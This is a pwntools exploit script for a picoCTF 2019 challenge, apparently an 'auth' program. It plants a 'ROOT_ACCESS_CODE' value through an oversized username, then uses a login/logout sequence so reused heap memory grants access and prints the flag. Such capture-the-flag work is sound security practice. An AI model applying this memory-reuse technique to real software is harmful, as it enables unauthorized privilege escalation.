#!/usr/bin/env python

from pwn import *

#r = process("./auth")
r = remote("2019shell1.picoctf.com", 37919)

def login(length, username):
    print("LOGIN")
    r.sendline("login")
    r.recvuntil("Please enter the length of your username\n")
    r.sendline(str(length))
    r.recvuntil("Please enter your username\n")
    r.sendline(username)

def logout():
    print("LOGOUT")
    r.sendline("logout")
    r.recvuntil("> ")

r.recvuntil("> ")

payload = (
    "A" * 40 +
    p64(0x4343415f544f4f52) +
    p64(0x45444f435f535345)
)

login(0x408, payload)
logout()
login(0x9, "B" * 0x8)
login(0x9, "C" * 0x8)

r.sendline("print-flag")
r.interactive()

r.close()
